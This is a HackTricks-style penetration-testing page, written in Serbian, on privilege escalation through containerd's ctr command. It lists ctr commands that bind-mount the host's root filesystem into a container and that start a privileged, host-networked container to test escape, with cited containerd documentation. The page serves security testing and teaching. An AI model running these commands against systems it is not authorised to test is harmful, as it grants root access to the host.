# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Posetite sledeći link da biste saznali **gde se `containerd` i `ctr` uklapaju u container stack**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Ako utvrdite da host sadrži komandu `ctr`, native CLI koji dolazi uz containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Možete izlistati images poznate containerd-u:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Zatim **pokrenite jednu od tih images sa root direktorijumom hosta rekurzivno bind-mounted na root direktorijum containera**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Pokrenite container u privileged režimu i testirajte escape.\
Privileged container koji koristi host networking možete pokrenuti na sledeći način:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` procesu dodeljuje efektivne Linux capabilities pozivaoca i uklanja nekoliko kontrola izolacije, ali escape i dalje zavisi od okruženja; koristite tehnike navedene na sledećoj stranici da biste ga testirali:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Početak rada sa containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementacija komande `ctr image`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementacija komande `ctr run`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Dokumentacija Linux kernela o shared-subtree](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI paket: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Zastavice komande containerd `ctr`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
